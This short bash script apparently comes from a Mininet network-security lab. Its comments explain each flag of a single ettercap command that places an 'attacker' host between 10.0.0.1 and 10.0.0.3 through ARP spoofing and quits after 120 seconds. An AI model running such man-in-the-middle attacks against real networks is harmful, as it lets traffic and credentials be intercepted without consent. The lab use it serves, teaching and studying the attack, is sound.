#!/bin/bash
#
# implements the MitM attack via ARP spoofing


# -T: runs ettercap in text-only mode
# -i: attacker-eth0 selects the network interface of the mininet host 'attacker' as the default interface 
# -M arp /10.0.0.1// /10.0.0.3//: executes the MitM attack via ARP spoofing by placing the attacker host inbetween the two given hosts
## NB: target notation (-M arp TARGET1 TARGET2) is MAC/IPv4/IPv6/PORT, hence the notation /10.0.0.1// -
# -s 's(120)q': quits ettercap after sleping for 120 seconds
ettercap -T -i attacker-eth0 -M arp /10.0.0.1// /10.0.0.3// -s 's(120)q'